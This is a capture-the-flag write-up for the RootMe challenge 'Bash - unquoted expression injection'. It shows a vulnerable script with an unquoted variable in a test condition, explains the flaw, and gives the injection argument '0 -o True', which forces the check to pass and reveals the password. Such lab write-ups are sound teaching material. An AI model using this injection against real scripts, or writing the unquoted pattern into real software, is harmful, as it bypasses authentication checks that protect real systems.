---
layout: default
title: RootMe
permalink: /app-script/bash-unquoted-expression-injection
---

# Bash - unquoted expression injection

## Statement
Bypass this script’s security to recover the validation password.

## Source code
```bash
#!/bin/bash
    
#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"
    
PASS=$(cat .passwd)
    
if test -z "${1}"; then
    echo "USAGE : $0 [password]"
    exit 1
fi
    
if test $PASS -eq ${1} 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi
    
exit 0
```

## Analyze
Let's analyze this code
```bash
#!/bin/bash
    
#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"
    
PASS=$(cat .passwd) # Target

if test -z "${1}"; then # -z is to check if first argument is empty
    echo "USAGE : $0 [password]"
    exit 1
fi
    
if test $PASS -eq ${1} 2>/dev/null; then # If first arg is equal to flag
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi
    
exit 0
```

So magic will happen here
```bash
if test $PASS -eq ${1} 2>/dev/null; then
```

## Exploitation
```bash
app-script-ch16@challenge02:~$ ./wrapper "0 -o True"
Well done you can validate the challenge with : *************
```

## How does it work ?
Like classic injections, our goal is to force the condition to validate.

With this argument: `"0 -o True"` script condition became
```bash
if test $PASS -eq 0 -o True 2>/dev/null; then
```
```bash
#!/bin/bash
    
#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"
    
PASS=$(cat .passwd)
    
if test -z "${1}"; then
    echo "USAGE : $0 [password]"
    exit 1
fi
    
if test $PASS -eq 0 -o True 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi
    
exit 0
```
`"0 -o True"`:
- `0` = Allows `-eq` to achieve its goal
- `-o` = Is OR in bash conditions
- `True` = Allows `-o` to make the condition as True

In pseudo-code, this changes the condition from:
```py
if $PASS == 0 :
```
to:
```py
if $PASS == 0 or True :
```